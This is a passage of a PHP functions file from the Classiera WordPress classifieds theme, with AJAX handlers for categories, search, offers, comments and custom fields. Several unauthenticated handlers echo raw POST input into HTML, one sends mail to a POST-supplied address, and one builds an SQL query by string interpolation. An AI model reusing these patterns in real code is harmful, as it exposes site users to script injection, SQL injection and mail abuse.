	<script type="text/javascript">
	var ajaxurl = '<?php echo admin_url('admin-ajax.php'); ?>';
	</script>
<?php 
}
add_action('wp_head','classiera_ajaxLocation');
function classiera_ajaxLocation(){ ?>
	<script type="text/javascript">
	var ajaxLocation = '<?php echo get_template_directory_uri() . '/inc/getlocation.php';?>';
	</script>
<?php	
}
/* Fix nextend facebook connect doesn't remove cookie after logout */
if (!function_exists('classiera_clear_nextend_cookie')) {
    function classiera_clear_nextend_cookie(){
        setcookie( 'nextend_uniqid',' ', time() - YEAR_IN_SECONDS, '/', COOKIE_DOMAIN );
        return 0;
    }
}
add_action('clear_auth_cookie', 'classiera_clear_nextend_cookie');
function classieraRoleTrns($classieraRole){
	if($classieraRole == 'administrator'){
		$classieraUserRole =  esc_html__( 'Administrator', 'classiera' );
	}elseif($classieraRole == 'contributor'){
		$classieraUserRole =  esc_html__( 'Contributor', 'classiera' );
	}elseif($classieraRole == 'subscriber'){
		$classieraUserRole =  esc_html__( 'Subscriber', 'classiera' );
	}elseif($classieraRole == 'author'){
		$classieraUserRole =  esc_html__( 'Author', 'classiera' );
	}elseif($classieraRole == 'editor'){
		$classieraUserRole =  esc_html__( 'Editor', 'classiera' );
	}else{
		$classieraUserRole =  esc_html__( 'User', 'classiera' );
	}
	echo $classieraUserRole;
}
function classieraPStatusTrns($classieraPstatus){
	if($classieraPstatus == 'publish'){
		$pStatus =  esc_html__( 'Publish', 'classiera' );
	}elseif($classieraPstatus == 'pending'){
		$pStatus =  esc_html__( 'Pending', 'classiera' );
	}elseif($classieraPstatus == 'draft'){
		$pStatus =  esc_html__( 'Draft', 'classiera' );
	}elseif($classieraPstatus == 'auto-draft'){
		$pStatus =  esc_html__( 'Auto draft', 'classiera' );
	}elseif($classieraPstatus == 'future'){
		$pStatus =  esc_html__( 'Future', 'classiera' );
	}elseif($classieraPstatus == 'private'){
		$pStatus =  esc_html__( 'Private', 'classiera' );
	}elseif($classieraPstatus == 'inherit'){
		$pStatus =  esc_html__( 'Inherit', 'classiera' );
	}elseif($classieraPstatus == 'trash'){
		$pStatus =  esc_html__( 'Trash', 'classiera' );
	}elseif($classieraPstatus == 'rejected'){
		$pStatus =  esc_html__( 'Rejected', 'classiera' );
	}else{
		$pStatus =  esc_html__( 'None', 'classiera' );
	}
	echo $pStatus;
}
//Categories Ajax Function//
add_action('wp_ajax_classieraGetSubCatOnClick', 'classieraGetSubCatOnClick');
add_action('wp_ajax_nopriv_classieraGetSubCatOnClick', 'classieraGetSubCatOnClick');
function classieraGetSubCatOnClick(){
	if(isset($_POST['mainCat'])){
		$cat_child = get_term_children( $_POST['mainCat'], 'category' );		
		$classierMainCatID = $_POST['mainCat'];
		if (!empty($cat_child)){
			$args = array(
				'show_count' => 0,
				'orderby' => 'name',
				'suppress_filters' => false,
				'depth' => 1,
				'hierarchical' => 1,						  
				'hide_if_empty' => false,
				'hide_empty' => 0, 
				'parent' => $classierMainCatID,
				'child_of' => $classierMainCatID,
			);
			$categories=  get_categories($args);
			foreach ($categories as $cat){				
				$lireturn .= '<li><a href="#" id="'.$cat->term_id.'">'.$cat->cat_name.'</a></li>';
			}
			echo $lireturn;
			die();
		}else{
			die();
		}
	}elseif(isset($_POST['subCat'])){
		$classierSubCatID = $_POST['subCat'];
		$cat_child = get_term_children( $classierSubCatID, 'category' );
		if (!empty($cat_child)){
			$args = array(
				'show_count' => 0,
				'orderby' => 'name',
				'suppress_filters' => false,
				'depth' => 1,
				'hierarchical' => 1,						  
				'hide_if_empty' => false,
				'hide_empty' => 0, 
				'parent' => $classierSubCatID,
				'child_of' => $classierSubCatID,
			);
			$categories=  get_categories($args);
			foreach ($categories as $cat){				
				$lireturn .= '<li><a href="#" id="'.$cat->term_id.'">'.$cat->cat_name.'</a></li>';
			}
			echo $lireturn;
			die();
		}else{
			die();
		}
	}
}
//Search Ajax Function//
add_action( 'wp_ajax_get_search_classiera', 'get_search_classiera' );
add_action( 'wp_ajax_nopriv_get_search_classiera', 'get_search_classiera' );
function get_search_classiera(){		
	$args = array( 
		'post_type' => 'post',
		'post_status' => 'publish',
		'order' => 'DESC',
		'orderby' => 'date',
		's' => $_POST['CID'],
		'posts_per_page' => -1,	 
	);
	$startWord = $_POST['CID'];
	$query = new WP_Query( $args );
	if($query->have_posts()){
		$allCat = esc_html__( ' in All Categories', 'classiera' );
		$allCatDisplay = $startWord.$allCat;
		while ($query->have_posts()){
			$query->the_post();
			$postCatgory = get_the_category( $post->ID );				
			$categoryName = $postCatgory[0]->name;
			$category = get_the_category();
			$catID = $category[0]->cat_ID;
			$catSlug = $category[0]->slug;
			if ($category[0]->category_parent == 0) {
				$tag = $category[0]->cat_ID;
				$tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
				if (isset($tag_extra_fields[$tag])) {
					$category_icon_code = $tag_extra_fields[$tag]['category_icon_code'];
					$category_icon_color = $tag_extra_fields[$tag]['category_icon_color'];
				}
			}else{
				$tag = $category[0]->category_parent;
				$tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
				if (isset($tag_extra_fields[$tag])) {
					$category_icon_code = $tag_extra_fields[$tag]['category_icon_code'];
					$category_icon_color = $tag_extra_fields[$tag]['category_icon_color'];
				}
			}
			if(!empty($category_icon_code)) {
				$category_icon = stripslashes($category_icon_code);
			}
			$theTitle = get_the_title();
			//$posttags = get_the_tags();
			$tagsArga = array( 
				'name__like' => $startWord,				
				'order' => 'ASC',	 
			);
			$displaytag = '';
			$tagstring = '';
			$posttags = get_tags($tagsArga);			
			if($posttags){
			  foreach($posttags as $tag) {
				$tagstring .= $tag->name.',';				
			  }
			}
			$str1 = rtrim($tagstring,',');
			$str = implode(',' ,array_unique(explode(',', $str1)));
			$srt2 = explode(',', $str);
			foreach($srt2 as $val){
				$displaytag .= '<li><a class="SearchLink" href="#" name="'.$val.'">'.$val.'</a></li>';
			}
			$title .= '<li><a class="SearchLink" href="#" name="'.$theTitle.'">'.$theTitle.'</a></li>';
			$categorydisplay .= '<li><a class="SearchCat" href="#" name="'.$categoryName.'" id="'.$catSlug.'">'.$startWord.'<span>in<i class="'.$category_icon.'"></i>'.$categoryName.'</span></a></li>';
		}
		echo"<ul>";
		echo '<li><a class="SearchCat" id="-1" href="#" name="all">'.$allCatDisplay.'</a></li>';
		echo $categorydisplay;
		//echo $title;		
		echo $displaytag;
		echo"</ul>";
	}else{
		?>
		<ul><li><a href="#">.<?php esc_html_e( 'No Result found related your search', 'classiera' );?></a></li></ul>
		<?php 
	}exit();
}
//Make Offer//
add_action( 'wp_ajax_make_offer_classiera', 'make_offer_classiera' );
add_action( 'wp_ajax_nopriv_make_offer_classiera', 'make_offer_classiera' );
function make_offer_classiera(){	
	$message = "";
	$offer_price = $_POST['offer_price'];
	$offer_email = $_POST['offer_email'];
	$classieraCP = $_POST['classiera_current_price'];
	$classieraPT = $_POST['classiera_post_title'];
	$classieraPU = $_POST['classiera_post_url'];
	$classieraAE = $_POST['classiera_author_email'];
	if(!empty($offer_price) && !empty($offer_email) && !empty($classieraCP) && !empty($classieraPT) && !empty($classieraPU) && !empty($classieraAE)){
		classiera_send_offer_to_author($offer_price, $offer_email, $classieraCP, $classieraPU, $classieraAE, $classieraPT);
		$message = esc_html__( 'Your Offer have been sent..! Please wait for reply from Author.', 'classiera' );
	}else{
		$message = esc_html__( 'Something is missing. Please try again.', 'classiera' );
	}
	echo $message;
	die();
	
}
//classiera_ajax_comments//
function classiera_ajax_comments($comment_ID, $comment_status){
	if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest'){
		switch ($comment_status) {
			case '0':
			//notify moderator of unapproved comment
			wp_notify_moderator($comment_ID);
			case '1': //Approved comment			
			$commentdata = get_comment($comment_ID, ARRAY_A);
			$authorEmail = $commentdata['comment_author_email'];
			//print_r( $commentdata);
			//$permaurl = get_permalink( $post->ID );
			//$url = str_replace('http://', '/', $permaurl);
			$author_avatar_url = classiera_get_avatar_url ($authorEmail, $size = '150' );
			$authorName = $commentdata['comment_author'];
			$comment_date_gmt = $commentdata['comment_date_gmt'];

			if($commentdata['comment_parent'] == 0){				
				$output = '<ul class="media-list"><li class="media"><div class="media-left"><img class="media-object img-thumbnail" src="'.$author_avatar_url.'"></div><div class="media-body"><h5 class="media-heading">'.$authorName.'&nbsp;&nbsp;<span class="normal">'.esc_html__( 'Said', 'classiera').'&nbsp;:</span><span class="time pull-right flip">'.$comment_date_gmt .'</span></h5><p>' . $commentdata['comment_content'] . '</p></div></li></ul>';
				
				echo $output;
			}
			else{
				$output = '<div class="media children" id="comment-' . $commentdata['comment_ID'] . '"><div class="media-left"><img class="media-object img-thumbnail" src="'.$author_avatar_url.'"></div><div class="media-body"><h5 class="media-heading">'.$authorName.'<span class="normal">'.esc_html_e( 'Said', 'classiera').'</span><span class="time pull-right flip">'.$comment_date_gmt .'</span></h5><p>' . $commentdata['comment_content'] . '</p></div></div>';
				
				echo $output;
			}
				$post = get_post($commentdata['comment_post_ID']);
				wp_notify_postauthor($comment_ID);
			break;
			default:
			echo "error";
		}
	exit;
	}
}
add_action('comment_post', 'classiera_ajax_comments', 25, 2);
//Buy or sell//
function classiera_buy_sell($text){	
	$string = str_replace(' ', '', $text);
	if($string == 'buy'){
		$returnVal = esc_html__( 'Wanted', 'classiera' );
	}elseif($string == 'sell'){
		$returnVal = esc_html__( 'For Sale', 'classiera' );
	}elseif($string == 'sold'){
		$returnVal = esc_html__( 'Sold', 'classiera' );
	}else{
		$returnVal = '';
	}
	echo $returnVal;
	
}
//Categories Custom Fields Ajax//
add_action( 'wp_ajax_classiera_Get_Custom_Fields', 'classiera_Get_Custom_Fields' );
add_action( 'wp_ajax_nopriv_classiera_Get_Custom_Fields', 'classiera_Get_Custom_Fields' );
function classiera_Get_Custom_Fields(){	
	$categoryID = $_POST['Classiera_Cat_ID'];
	$categoryName = get_cat_name( $categoryID );
	$cat_data = get_option(MY_CATEGORY_FIELDS);
	$thisCategoryOptions = $cat_data[$categoryID];
	if(isset($thisCategoryOptions)){
		$optionData = array();
		$selectFeature = esc_html__( 'Select Feature', 'classiera' );
		$thisCategoryFields = $thisCategoryOptions['category_custom_fields'];		
		$thisCategoryType = $thisCategoryOptions['category_custom_fields_type'];
		echo '<div class="form-main-section extra-fields wrap-content cat-'.$categoryID.'">';
		$counter = "";
		for($counter = 0; $counter < (count($thisCategoryFields)); $counter++){			
		}
		if($counter > 0){
			echo '<h4 class="text-uppercase border-bottom">'.esc_html__('Extra Fields For', 'classiera').'&nbsp;'.$categoryName.':</h4>';
		}
		for($i = 0; $i < (count($thisCategoryFields)); $i++){ 
			if($thisCategoryType[$i][1] == 'text'){
				echo '<div class="form-group cat-'.$categoryID.'"><label class="col-sm-3 text-left flip">'.$thisCategoryFields[$i][0].': <span>*</span></label><div class="col-sm-6"><input type="hidden" class="custom_field" id="custom_field['.$i.'][0]" name="'.$categoryID.'custom_field['.$i.'][0]" value="'.$thisCategoryFields[$i][0].'" size="12"><input type="text" class="form-control form-control-md" id="custom_field['.$i.'][1]" name="'.$categoryID.'custom_field['.$i.'][1]" placeholder="'.$thisCategoryFields[$i][0].'" size="12"></div></div>';
			}
		}
		for($i = 0; $i < (count($thisCategoryFields)); $i++){			
			if($thisCategoryType[$i][1] == 'dropdown'){
				$options = $thisCategoryType[$i][2];
				$optionsarray = explode(',',$options);
				foreach($optionsarray as $option){
					$optionData[$i] .= '<option value="'.$option.'">'.$option.'</option>';
				}
				echo '<div class="form-group cat-'.$categoryID.'"><label class="col-sm-3 text-left flip">'.$thisCategoryFields[$i][0].': <span>*</span></label><div class="col-sm-6"><div class="inner-addon right-addon"><i class="form-icon right-form-icon fa fa-angle-down"></i><input type="hidden" class="custom_field" id="custom_field['.$i.'][0]" name="'.$categoryID.'custom_field['.$i.'][0]" value="'.$thisCategoryFields[$i][0].'" size="12"><input type="hidden" class="custom_field" id="custom_field['.$i.'][2]" name="'.$categoryID.'custom_field['.$i.'][2]" value="'.$thisCategoryType[$i][1].'" size="12"><select class="form-control form-control-md" id="custom_field['.$i.'][1]" name="'.$categoryID.'custom_field['.$i.'][1]"><option>'.$thisCategoryFields[$i][0].'</option>'.$optionData[$i].'</select></div></div></div>';
			}			
		}
		for($i = 0; $i < (count($thisCategoryFields)); $i++){
			if($thisCategoryType[$i][1] == 'checkbox'){
				echo '<div class="form-group form__check cat-'.$categoryID.'"><p class="featurehide featurehide'.$i.'">'.$selectFeature.'</p><div class="col-sm-6"><div class="inner-addon right-addon"><i class="form-icon right-form-icon fa fa-angle-down"></i><input type="hidden" class="custom_field" id="custom_field['.$i.'][0]" name="'.$categoryID.'custom_field['.$i.'][0]" value="'.$thisCategoryFields[$i][0].'" size="12"><input type="hidden" class="custom_field" id="custom_field['.$i.'][2]" name="'.$categoryID.'custom_field['.$i.'][2]" value="'.$thisCategoryType[$i][1].'" size="12"><div class="checkbox"><input type="checkbox" class="custom_field custom_field_visible input-textarea newcehckbox" id="'.$categoryID.'custom_field['.$i.'][1]" name="'.$categoryID.'custom_field['.$i.'][1]"><label for="'.$categoryID.'custom_field['.$i.'][1]" class="newcehcklabel">'.$thisCategoryFields[$i][0].'</label></div></div></div></div>';
			}
		}
		echo '</div>';
	}
	die();
	
}
function classiera_cat_has_child($mainID){
	global $wpdb;
	$term = $mainID;
	$children_check = $wpdb->get_results(" SELECT * FROM {$wpdb->prefix}term_taxonomy WHERE parent = '$term'");
    if($children_check){
        return true;
    }else{
        return false;
    }
}
function classiera_Display_cat_level($classieraPostID){
	$categories = get_the_category($classieraPostID);
	
	if(!empty($categories)){		
		$output = "";
		$mainCat = "";
		$childCat = '';	
		foreach ($categories as $category){
			if(!$category->parent){
				$mainCat = $category->term_id;
				$output .= '<a href="' . esc_url( get_category_link( $category->term_id ) ) . '" title="' . esc_attr( sprintf( __( "View all posts in %s", 'classiera'), $category->name ) ) . '" >' . $category->name.'</a>';
			}
		}		
		if(!empty($mainCat)){
			foreach ($categories as $category) {
				if( $category->parent == $mainCat){
					$childCat = $category->term_id;
					$output .= ' / <a href="' . esc_url( get_category_link( $category->term_id ) ) . '" title="' . esc_attr( sprintf( __( "View all posts in %s", 'classiera'), $category->name ) ) . '" >' . $category->name.'</a>';
				}
			}
		}		
		if(!empty($childCat)){
			foreach ($categories as $category) {
				if( $category->parent == $childCat){
					$output .= ' / <a href="' . esc_url( get_category_link( $category->term_id ) ) . '" title="' . esc_attr( sprintf( __( "View all posts in %s", 'classiera'), $category->name ) ) . '" >' . $category->name.'</a>';
				}
			}
		}
		if(empty($output)){
			foreach ($categories as $category){
				$output .= '<a href="' . esc_url( get_category_link( $category->term_id ) ) . '" title="' . esc_attr( sprintf( __( "View all posts in %s", 'classiera'), $category->name ) ) . '" >' . $category->name.'</a>';
			}
		}		
		echo trim( $output, "," );
	}
}